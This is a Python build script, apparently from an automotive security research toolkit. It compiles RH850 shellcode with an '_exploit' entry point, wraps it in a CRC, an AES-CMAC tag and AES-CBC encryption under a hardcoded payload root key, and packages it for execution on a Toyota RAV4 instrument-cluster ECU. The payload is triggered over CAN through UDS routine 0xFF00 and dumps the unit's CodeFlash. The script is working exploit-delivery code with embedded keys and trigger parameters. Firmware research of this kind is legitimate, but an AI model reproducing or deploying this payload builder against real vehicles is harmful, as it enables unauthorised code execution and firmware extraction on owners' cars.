#!/usr/bin/env python3
"""Build an authenticated RAV4 meter CodeFlash dumper for offline verification."""
from __future__ import annotations

import argparse
import binascii
import hashlib
import json
import struct
import subprocess
import tempfile
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Hash import CMAC

from tsk.common.payload_package import derive_payload_key

from tools.rh850_toolchain import command as rh850_command
from tools.rh850_toolchain import metadata as toolchain_metadata

REPO = Path(__file__).resolve().parents[2]
SOURCE = REPO / "tsk/dumper/rav4_meter_main.c"
DEFAULT_OUTPUT = REPO / "build/out/rav4-meter-dumper/payload.bin"
LOAD_ADDRESS = 0xFEDD7800
LOAD_SIZE = 0x800
TAG_OFFSET = 0x7F0
CRC_OFFSET = TAG_OFFSET - 4
PAYLOAD_ROOT = bytes.fromhex("22620f1d268f9aa5275e0307c6b18f51")
DID_KEY = bytes(16)
DID_IV = bytes(16)
DEFAULT_DUMP_START = 0
DEFAULT_DUMP_LENGTH = 0x200000
TRIGGER_ROUTINE = 0xFF00
TRIGGER_OPTION = bytes.fromhex("4500")
TRIGGER_ADDRESS = 0x00010000
TRIGGER_LENGTH = 0x001F0000


class BuildError(RuntimeError):
    pass


def _validate_range(start: int, length: int) -> None:
    if start < 0 or start & 3 or length <= 0 or length & 3:
        raise BuildError("dump start/length must be aligned, with positive length")
    if start + length > DEFAULT_DUMP_LENGTH:
        raise BuildError("dump range must stay within CodeFlash [0, 0x200000)")


def build(
    output: Path, *, start: int = 0, length: int = DEFAULT_DUMP_LENGTH,
    spin_limit: int = 0x01000000,
) -> dict:
    _validate_range(start, length)
    if spin_limit <= 0 or spin_limit > 0xFFFFFFFF:
        raise BuildError("spin limit must be a positive uint32")
    output = Path(output)
    with tempfile.TemporaryDirectory(prefix="rav4-meter-dumper-") as directory:
        work = Path(directory)
        cmd = rh850_command(work)
        elf = "/out/payload.elf"
        subprocess.run(cmd + [
            "v850-elf-gcc", "-mv850e3v5", "-mno-app-regs", "-fPIC",
            "-ffreestanding", "-fno-toplevel-reorder",
            "-fno-delete-null-pointer-checks", "-fno-builtin",
            "-Wall", "-Wextra", "-Werror", "-Os", "-g", "-nostdlib",
            f"-DDUMP_START=0x{start:X}u", f"-DDUMP_LENGTH=0x{length:X}u",
            f"-DTX_SPIN_LIMIT=0x{spin_limit:X}u",
            f"-Wl,-Ttext=0x{LOAD_ADDRESS:X}", "-Wl,-e,_exploit",
            "-Wl,--build-id=none", "/src/tsk/dumper/rav4_meter_main.c",
            "-o", elf,
        ], check=True)
        subprocess.run(cmd + [
            "v850-elf-objcopy", "-O", "binary", "-j", ".text",
            elf, "/out/payload.text.bin",
        ], check=True)
        def inspect(*args: str) -> str:
            return subprocess.run(cmd + list(args) + [elf], check=True,
                                  capture_output=True, text=True).stdout
        nm = inspect("v850-elf-nm", "-n")
        disasm = inspect("v850-elf-objdump", "-d")
        sections = inspect("v850-elf-objdump", "-h")
        symbols = {}
        for line in nm.splitlines():
            parts = line.split()
            if len(parts) == 3:
                symbols[parts[2]] = int(parts[0], 16)
        if symbols.get("_exploit") != LOAD_ADDRESS:
            raise BuildError("payload entry must be at the load address")
        shellcode = (work / "payload.text.bin").read_bytes()
        if not shellcode or len(shellcode) > CRC_OFFSET:
            raise BuildError("payload text overlaps the reserved CRC or authentication tag")
        # This source must remain self-contained in .text; extraction cannot
        # silently omit initialized data, literal pools or runtime zero storage.
        for line in sections.splitlines():
            fields = line.split()
            if len(fields) >= 3 and fields[1] in (".data", ".rodata", ".bss", ".sdata", ".sbss"):
                if int(fields[2], 16):
                    raise BuildError(f"unexpected nonempty section {fields[1]}")
        plaintext = bytearray(shellcode.ljust(CRC_OFFSET, b"\x00"))
        crc32 = binascii.crc32(plaintext) & 0xFFFFFFFF
        plaintext.extend(struct.pack("<I", crc32))
        key = derive_payload_key(PAYLOAD_ROOT, DID_KEY)
        cmac = CMAC.new(key, ciphermod=AES)
        cmac.update(DID_IV + plaintext)
        plaintext.extend(cmac.digest())
        payload = AES.new(key, AES.MODE_CBC, iv=DID_IV).encrypt(plaintext)
        output.parent.mkdir(parents=True, exist_ok=True)
        output.write_bytes(payload)
        output.with_suffix(".plaintext.bin").write_bytes(plaintext)
        output.with_suffix(".elf").write_bytes((work / "payload.elf").read_bytes())
        output.with_suffix(".text.bin").write_bytes(shellcode)
        output.with_suffix(".nm").write_text(nm)
        output.with_suffix(".disasm").write_text(disasm)
        toolchain = toolchain_metadata()
    digest = lambda data: hashlib.sha256(data).hexdigest()
    metadata = {
        "schema": "rav4-meter-codeflash-dumper-v1",
        "target": "r4p-838004AD91",
        "source": str(SOURCE.relative_to(REPO)),
        "source_sha256": digest(SOURCE.read_bytes()),
        "backend": "tools/rh850", "toolchain": toolchain,
        "link_vma": f"0x{LOAD_ADDRESS:08X}", "entry_offset": 0,
        "shellcode_size": len(shellcode), "shellcode_sha256": digest(shellcode),
        "payload_size": len(payload), "payload_sha256": digest(payload),
        "plaintext_sha256": digest(plaintext), "crc_offset": CRC_OFFSET,
        "crc32": f"0x{crc32:08X}",
        "tag_offset": TAG_OFFSET, "did_0201": DID_KEY.hex(), "did_0202": DID_IV.hex(),
        "dump_start": f"0x{start:08X}", "dump_length": f"0x{length:08X}",
        "tx_spin_limit": spin_limit,
        "dump_end": f"0x{start + length:08X}", "read_only_codeflash": True,
        "response_can_id": "0x7C8", "request_can_id": "0x7C0",
        "trigger_routine": f"0x{TRIGGER_ROUTINE:04X}",
        "trigger_request_data": (
            TRIGGER_OPTION + struct.pack(">II", TRIGGER_ADDRESS, TRIGGER_LENGTH)
        ).hex(),
        "transport": "initialized classic RSCAN channel 2, TX buffer 2",
        "watchdog": "meter firmware WDTA service with 100% window configuration",
        "execution": "mode 1 only; stock software reset on completion or fault",
    }
    output.with_suffix(output.suffix + ".json").write_text(
        json.dumps(metadata, indent=2, sort_keys=True) + "\n")
    return metadata


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("output", nargs="?", type=Path, default=DEFAULT_OUTPUT)
    parser.add_argument("--start", type=lambda v: int(v, 0), default=0)
    parser.add_argument("--length", type=lambda v: int(v, 0), default=DEFAULT_DUMP_LENGTH)
    args = parser.parse_args()
    try:
        result = build(args.output, start=args.start, length=args.length)
    except (BuildError, OSError, subprocess.CalledProcessError) as exc:
        parser.error(str(exc))
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
